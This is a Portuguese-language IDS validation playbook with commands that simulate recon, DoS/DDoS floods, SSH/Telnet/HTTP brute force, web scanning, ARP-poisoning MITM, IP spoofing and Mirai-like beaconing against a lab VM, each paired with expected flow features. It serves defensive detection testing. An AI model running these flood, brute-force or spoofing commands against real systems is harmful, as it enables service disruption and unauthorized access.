# Attack Testing — IDS Validation

Comandos para simular cada classe de ataque do dataset contra a VIM 4.

**Alvo**: `192.168.100.5` (VIM 4)  
**Origem**: `192.168.100.232` (máquina de teste)  
**Interface monitorada**: `eth0`

---

## Instalação das ferramentas

```bash
# Ferramentas principais (repositório extra)
sudo pacman -S nmap hping ettercap-gtk dsniff gobuster masscan medusa python-scapy

# Wordlists (AUR) — necessárias para brute force e web attacks
yay -S rockyou dirbuster-wordlists
```

> **Notas de instalação:**
> - `hping` é o nome do pacote no Arch; o binário chama-se `hping3`.
> - `arpspoof` não é pacote separado — vem dentro do `dsniff`.
> - `hydra` foi omitido: depende de `mariadb-libs`, que conflita com `libmysqlclient80`. Use `medusa` no lugar.
> - `rockyou` instala em `/usr/share/wordlists/rockyou.txt`.
> - `dirbuster-wordlists` instala em `/usr/share/wordlists/dirbuster/`.

> **Nikto** falha com `ERROR: Required module not found: XML::Writer`. Corrigir com:
> ```bash
> sudo cpan XML::Writer
> ```

---

## Recon

Padrão esperado: alto `flow_pkts_s`, `flow_duration` curto, `bwd_pkts_s` próximo de zero (maioria das probes não recebe resposta), `syn_flag_cnt` alto sem ACK completo.

```bash
# SYN scan (stealth) — padrão recon clássico
sudo nmap -sS 192.168.100.5

# Scan agressivo: OS detection + versão de serviços + scripts
sudo nmap -A -T4 192.168.100.5

# Scan de todas as 65535 portas
sudo nmap -p- -T4 192.168.100.5

# UDP scan
sudo nmap -sU --top-ports 200 192.168.100.5

# Ping sweep (host discovery)
nmap -sn 192.168.100.0/24

# Masscan — scan de portas mais rápido
sudo masscan 192.168.100.5 -p1-65535 --rate=1000
```

---

## DoS

Padrão esperado: `flow_pkts_s` muito alto, `flow_byts_s` alto, `flow_duration` variável, `bwd_pkts_s` zero ou próximo disso.

```bash
# SYN flood na porta 80
sudo hping3 -S --flood -p 80 192.168.100.5

# SYN flood com IP aleatório (spoofed)
sudo hping3 -S --flood -p 80 --rand-source 192.168.100.5

# UDP flood na porta 53
sudo hping3 --udp --flood -p 53 192.168.100.5

# ICMP flood
sudo hping3 --icmp --flood 192.168.100.5

# Controlar a taxa (ex: 10.000 pacotes/s)
sudo hping3 -S -p 80 --faster 192.168.100.5
```

---

## DDoS (simulado localmente)

Simula múltiplas origens com IPs spoofados contra a VIM 4.

```bash
# SYN flood com source aleatório — simula múltiplos atacantes
sudo hping3 -S --flood -p 443 --rand-source 192.168.100.5

# Usando scapy para gerar tráfego mais customizável
sudo python3 -c "
from scapy.all import *
import random, time
target = '192.168.100.5'
for _ in range(10000):
    src = f'10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'
    send(IP(src=src, dst=target)/TCP(dport=80, flags='S'), verbose=0)
"
```

---

## Brute Force

Padrão esperado: muitas conexões TCP curtas na mesma porta, `syn_flag_cnt` alto, `fwd_psh_flags` alto, tráfego bidirecional com pacotes pequenos e uniformes.

```bash
# SSH brute force — usuário fixo, wordlist
medusa -h 192.168.100.5 -u root -P /usr/share/wordlists/rockyou.txt -M ssh

# SSH brute force — lista de usuários + wordlist, 4 threads
medusa -h 192.168.100.5 \
       -U /usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt \
       -P /usr/share/wordlists/rockyou.txt \
       -M ssh -t 4

# HTTP Basic Auth brute force
medusa -h 192.168.100.5 -u admin \
       -P /usr/share/wordlists/rockyou.txt \
       -M http -m DIR:/

# Telnet brute force (padrão Mirai)
medusa -h 192.168.100.5 -u root \
       -P /usr/share/wordlists/rockyou.txt \
       -M telnet
```

---

## Web Attacks

Padrão esperado: muitas requisições HTTP curtas, `dst_port = 80` ou `443`, `flow_pkts_s` moderado a alto, pacotes de tamanho variável.

```bash
# Nikto — scanner de vulnerabilidades web
nikto -h http://192.168.100.5

# Gobuster — directory brute force
gobuster dir -u http://192.168.100.5 \
             -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Gobuster com wordlist maior
gobuster dir -u http://192.168.100.5 \
             -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
             -t 20

# Flood de requisições HTTP (simula web DoS)
for i in $(seq 1 500); do
  curl -s -o /dev/null http://192.168.100.5/ &
done
wait
```

---

## MITM

Padrão esperado: tráfego ARP anômalo, `flow_duration` longa, pacotes interceptados com tamanho ligeiramente alterado, `protocol` 6 (TCP) com IPs incomuns como relay.

```bash
# ARP poisoning: dizer à VIM 4 que o gateway é nossa máquina
sudo arpspoof -i eth0 -t 192.168.100.5 192.168.100.1

# ARP poisoning bidirecional (em dois terminais):
# Terminal 1:
sudo arpspoof -i eth0 -t 192.168.100.5 192.168.100.1
# Terminal 2:
sudo arpspoof -i eth0 -t 192.168.100.1 192.168.100.5

# Habilitar IP forwarding para não derrubar a conexão do alvo
sudo sysctl -w net.ipv4.ip_forward=1

# Ettercap — MITM com interface gráfica
sudo ettercap -T -i eth0 -M arp:remote /192.168.100.5// /192.168.100.1//
```

---

## Spoofing

Padrão esperado: pacotes com `src_ip` falsificado, flags TCP/UDP inconsistentes com o estado esperado da conexão, `flow_duration` zero ou muito curto.

```bash
# TCP packet com IP spoofado (scapy)
sudo python3 -c "
from scapy.all import *
send(IP(src='1.2.3.4', dst='192.168.100.5')/TCP(dport=80, flags='S'))
"

# UDP spoofado
sudo python3 -c "
from scapy.all import *
send(IP(src='1.2.3.4', dst='192.168.100.5')/UDP(dport=53)/Raw(b'spoofed'))
"

# ICMP spoofado
sudo python3 -c "
from scapy.all import *
send(IP(src='8.8.8.8', dst='192.168.100.5')/ICMP())
"

# hping3 com source fixo spoofado
sudo hping3 -S -p 80 -a 1.2.3.4 192.168.100.5
```

---

## Malware (simulação de tráfego C2)

O dataset `malware` inclui principalmente tráfego Mirai (IoT botnet). O padrão é: scanning de portas Telnet (23) e SSH (22), conexões repetidas curtas, pequenos payloads.

```bash
# Simular scanning Telnet (padrão Mirai)
sudo nmap -p 23,2323 -T5 192.168.100.5

# Conexões TCP repetidas rápidas (simula C2 beacon)
for i in $(seq 1 200); do
  nc -z -w1 192.168.100.5 4444 2>/dev/null
  sleep 0.1
done

# Flood de conexões Telnet
sudo hping3 -S --flood -p 23 192.168.100.5
```

---

## Tráfego Benigno (referência)

Para comparar e verificar que o modelo classifica abaixo do threshold:

```bash
# Download grande e contínuo (deve pontuar baixo)
wget -O /dev/null http://speed.hetzner.de/100MB.bin

# ICMP ping regular
ping -c 30 -i 1 192.168.100.5

# DNS lookup
dig @8.8.8.8 google.com
```

---

## Notas

- Todos os comandos acima são para uso exclusivo em ambiente controlado e autorizado.
- O IDS captura flows em `eth0` — garanta que o tráfego gerado passe por essa interface.
- Flows muito curtos (< 3 pacotes) podem ser emitidos pelo netflower como micro-flows com `flow_duration = 0`, que sempre pontuam alto independentemente do tipo — é um artefato de captura, não detecção real.
- Para ataques que precisam de IP forwarding (MITM), lembrar de reverter após o teste: `sudo sysctl -w net.ipv4.ip_forward=0`.
